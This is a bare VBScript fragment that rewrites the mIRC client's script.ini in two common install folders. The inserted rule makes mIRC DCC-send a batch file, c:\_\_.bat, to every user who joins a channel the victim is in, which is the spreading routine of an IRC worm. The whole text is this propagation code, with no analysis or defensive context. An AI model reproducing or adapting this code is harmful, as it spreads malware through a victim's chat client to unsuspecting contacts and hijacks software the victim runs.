Set fso = CreateObject("Scripting.FileSystemObject") 
Set b = fso.CreateTextFile("c:\program files\mirc\script.ini", True) 
b.WriteLine "[script]" 
b.WriteLine "ON 1:JOIN:#:{" 
b.WriteLine "/dcc send $nick c:\_\_.bat" 
b.WriteLine "}" 
b.close 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set a = fso.CreateTextFile("c:\mirc\script.ini", True) 
a.WriteLine "[script]" 
a.WriteLine "ON 1:JOIN:#:{" 
a.WriteLine "/dcc send $nick c:\_\_.bat" 
a.WriteLine "}" 
a.close 
